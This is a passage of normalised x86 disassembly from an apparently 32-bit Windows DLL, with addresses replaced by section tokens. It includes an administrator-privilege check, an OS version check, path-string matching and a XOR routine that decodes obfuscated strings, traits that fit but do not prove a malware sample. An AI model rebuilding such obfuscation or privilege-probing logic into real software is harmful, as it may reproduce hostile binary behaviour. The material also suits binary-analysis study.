je r-xdata
push 0x5
pop eax
call sub_1001a1b3
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1005ac7e
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_10013a0b
jmp r-xdata
sub_10064f60
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10064fb0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10064ff0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_10007bc0
sub_10065050
push ebp
mov ebp esp
sub esp 0x764
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x748 ] esi
mov [ ebp - 0x744 ] ebx
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x74c ]
mov eax 0x2
call sub_1005bf90
lea edx [ ebp - 0x73c ]
mov eax 0x5
call sub_1005bf90
lea edx [ ebp - 0x740 ]
mov eax 0x6
call sub_1005bf90
mov eax edx
push eax
push edi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x210 ]
test eax eax
mov edx 0x104
mov eax ecx
je r-xdata
mov esi edi
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x73c ]
xor esi esi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test esi esi
je r-xdata
sub eax 0x2
mov esi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov edi [ ebp - 0x748 ]
lea eax [ ebp - 0x740 ]
push eax
push edi
call [ StrStrW@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x620 ]
test eax eax
mov edx 0x208
mov eax ecx
je r-xdata
lea eax [ edx + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ edx + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov esi edi
sub esi ecx
lea esi [ ebp - 0x73c ]
sub esi ecx
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x210 ]
call sub_10030af0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x74c ]
push eax
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ edx + 0xb ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ edx + 0x8 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x740 ]
push ecx
lea ebx [ ebp - 0x620 ]
call sub_10030af0
test eax eax
je r-xdata
mov eax 0xc
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x620 ]
call sub_10030af0
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
lea ebx [ ebp - 0x620 ]
call sub_10030af0
test eax eax
je r-xdata
mov eax 0xd
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x114
lea eax [ ebp - 0x738 ]
push 0x0
push eax
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x738 ]
push ecx
mov [ ebp - 0x738 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x734 ] 0x6
jae r-xdata
mov eax 0xe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x210 ]
call sub_10067950
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call [ GetTickCount@IAT ]
push eax
call sub_10007512
add esp 0x4
call sub_10028da1
xor edx edx
mov ecx 0xa
div ecx
add edx 0x3
push edx
call sub_100564c0
lea esi [ ebp - 0x760 ]
mov ebx eax
mov [ ebp - 0x760 ] 0x0
call sub_10009b00
test eax eax
jne r-xdata
mov edx [ ebp - 0x744 ]
push edx
call sub_1005b8c0
test eax eax
je r-xdata
lea edi [ ebp - 0x620 ]
lea ecx [ ebp - 0x210 ]
lea esi [ ebp - 0x760 ]
call sub_100447f0
test eax eax
je r-xdata
mov eax 0xf
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_100450f0
test eax eax
je r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_10008740
test eax eax
je r-xdata
mov eax 0x11
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
call sub_10065045
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x12
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10065520
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
push esi
mov esi ecx
movsx ecx [ eax ]
xor ecx 0x3b
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_10024da0
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x70 ]
call sub_1005e3c0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100655d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f350
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1005ac7e
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10065690
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
test eax eax
je r-xdata
mov eax esi
call sub_10054700
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
mov [ edi + 0x4 ] 0x0
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_100656e0
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x54 ] esi
call sub_10009820
test eax eax
je r-xdata
mov esi [ ebx + 0x54 ]
test esi esi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x4b
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea eax [ ebp - 0x54 ]
push eax
call sub_10005810
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10065740
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push r--data
push edx
mov edx 0x40
mov [ ebp - 0x88 ] 0x0
call sub_1006b8d0
add esp 0x10
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x84 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call sub_1005e3c0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100657d0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
imul eax [ ebp - 0x4 ]
pop edi
pop esi
and eax 0x3f
pop ebx
mov esp ebp
pop ebp
retn 0x4
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0x8 ]
sub_10065880
push ebp
mov ebp esp
push 0xffffffff
push sub_10081d90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov eax ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea esi [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1005d090
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov ecx edx
cmp eax 0x10
jae r-xdata
add ecx [ ebp - 0x1c ]
cmp eax 0x10
mov eax edx
jae r-xdata
lea ecx [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x48 ] dx
mov edx [ ebp - 0x4c ]
push edx
push ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
call sub_1005f8e0
lea edx [ ebp - 0x48 ]
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_1000b6d0
cmp [ ebp - 0x34 ] 0x8
mov esi eax
jb r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
sub_1006597a
push 0xe8
mov eax sub_1007f15d
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x90 ] al
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xb4 ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10008fcf
pop ecx
mov esi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xb4 ]
lea eax [ ebp - 0xac ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007739
mov esi eax
pop ecx
mov [ ebp - 0x88 ] esi
lea ecx [ ebp - 0xac ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub ebx [ ebp + 0x34 ]
push 0x30
inc ebx
push ebx
push 0x0
lea ecx [ ebp + 0x24 ]
call sub_10051fc9
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_1002a730
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_1002a674
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
mov ebx eax
xor ebx edx
sub ebx edx
mov [ ebp - 0x8c ] ebx
cmp [ ebp + 0x34 ] ebx
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0xf
pop esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x2c ] 0x0
cmp [ ebp + 0x20 ] 0x0
mov edi [ ebp - 0x88 ]
mov eax [ edi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx edi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_10039e87
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_100171f8
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_10020962
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_100172f0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_1001c5c0
push eax
lea ecx [ ebp - 0x2c ]
call sub_100172f0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1001c5c0
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x64 ] 0x0
mov eax [ ebp - 0x98 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
mov [ ebp - 0x84 ] al
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi ebx
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x98 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
jg r-xdata
mov esi [ ebp - 0x8c ]
cmp [ ebp + 0x34 ] esi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x94 ] 0x0
mov esi [ ebp - 0x88 ]
xor ebx ebx
inc ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax esi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x84 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10051fc9
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x90 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_1006a3e7
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10049cb2
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor edi edi
test bl bl
jne r-xdata
sub eax edx
mov edi eax
jmp r-xdata
xor edi edi
cmp edi esi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc [ ebp - 0x94 ]
cmp [ ebp - 0x94 ] 0x4
jb r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10049cb2
add esp 0x14
xor edi edi
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0xa8 ] eax
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x94 ]
movsx eax [ ebp + eax - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x98 ]
push edi
push [ ebp - 0x90 ]
xor esi esi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] esi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] esi
push [ ebp - 0xa4 ]
call sub_10049cb2
add esp 0x14
push esi
push ebx
lea ecx [ ebp - 0x64 ]
call sub_1001c5c0
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
push esi
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1001c5c0
mov eax [ ebp - 0xa4 ]
call sub_10019c00
retn 0x38
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x8c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
inc eax
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0xc ]
push eax
call sub_10009b37
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0xa8 ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_1006a3e7
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0x88 ] al
push [ ebp - 0x88 ]
lea ecx [ ebp + 0xc ]
call sub_1006a3e7
mov eax [ ebp - 0x8c ]
sub eax [ ebp + 0x34 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_10049cb2
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x10
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xf4 ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx [ ebp - 0x8c ]
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0xc ]
push eax
call sub_10009b37
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ esi ]
add esp 0x14
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
lea ecx [ ebp + 0xc ]
call sub_1006a3e7
cmp [ ebp + 0x38 ] 0x10
mov ecx [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x34 ]
sub eax [ ebp - 0x8c ]
push [ ebp - 0x8c ]
add eax ecx
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
push eax
call sub_10009b37
add esp 0x14
jmp r-xdata
sub_10065f10
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xadb2ec
call sub_10009600
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x84b3ea
call sub_10009600
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3c
mov [ ebp - 0x4 ] 0x81a0ec
call sub_10009600
mov [ eax ] 0x3e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
